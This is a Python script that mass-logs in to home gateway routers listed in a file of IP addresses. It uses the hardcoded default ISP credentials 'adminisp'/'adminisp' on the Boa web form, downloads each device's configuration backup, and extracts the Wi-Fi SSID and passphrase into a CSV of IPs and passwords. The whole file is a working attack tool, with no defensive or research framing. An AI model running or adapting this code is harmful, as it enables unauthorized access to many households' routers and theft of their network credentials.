import os
import csv
import xml.etree.ElementTree as ET
import requests
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_login_request(ip):
    url = f"http://{ip}/boaform/admin/formLogin"
    headers = {
        # Your headers here
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"username": "adminisp", "psd": "adminisp"}

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        logging.info(f"Login request sent successfully to {ip}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send login request to {ip}: {str(e)}")
        raise

def send_download_request(ip):
    url = f"http://{ip}/boaform/formSaveConfig"
    headers = {
        # Your headers here
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"save_cs": "Backup..."}

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        filename = f"{ip}.xml"
        folder_path = "home_xml"
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, filename)
        with open(file_path, "wb") as file:
            file.write(response.content)
        logging.info(f"Downloaded file saved: {file_path}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to download config from {ip}: {str(e)}")
        raise

def process_ip(ip):
    """Process an IP address by sending login and download requests."""
    try:
        send_login_request(ip)
        send_download_request(ip)
        return ip
    except requests.exceptions.RequestException:
        return None

def main():
    with open("home_gateway.txt", "r") as file:
        ip_list = file.read().splitlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(process_ip, ip): ip for ip in ip_list}
        completed_ips = []
        for future in as_completed(futures):
            result = future.result()
            if result:
                completed_ips.append(result)

    return completed_ips

def parse_xml_files(directory):
    ssid_key_pairs = []

    for filename in os.listdir(directory):
        if filename.endswith(".xml"):
            ip = filename[:-4]
            file_path = os.path.join(directory, filename)

            try:
                tree = ET.parse(file_path)
                root = tree.getroot()

                ssid_element = root.find(".//Value[@Name='SSID']")
                keypassphrase_element = root.find(".//Value[@Name='WSC_PSK']")

                if ssid_element is not None and keypassphrase_element is not None:
                    ssid = ssid_element.attrib["Value"]
                    keypassphrase = keypassphrase_element.attrib["Value"]
                    ssid_key_pairs.append((ip, ssid, keypassphrase))
            except ET.ParseError as e:
                logging.error(f"Error parsing XML file {file_path}: {str(e)}")

    return ssid_key_pairs

def save_to_csv(pairs, output_file):
    with open(output_file, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["IP", "SSID", "KeyPassphrase"])
        writer.writerows(pairs)
    logging.info(f"Data written to CSV file {output_file}")

if __name__ == "__main__":
    try:
        completed_ips = main()
        directory_path = "home_xml"
        output_file = "home_pass.csv"

        pairs = parse_xml_files(directory_path)
        save_to_csv(pairs, output_file)
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")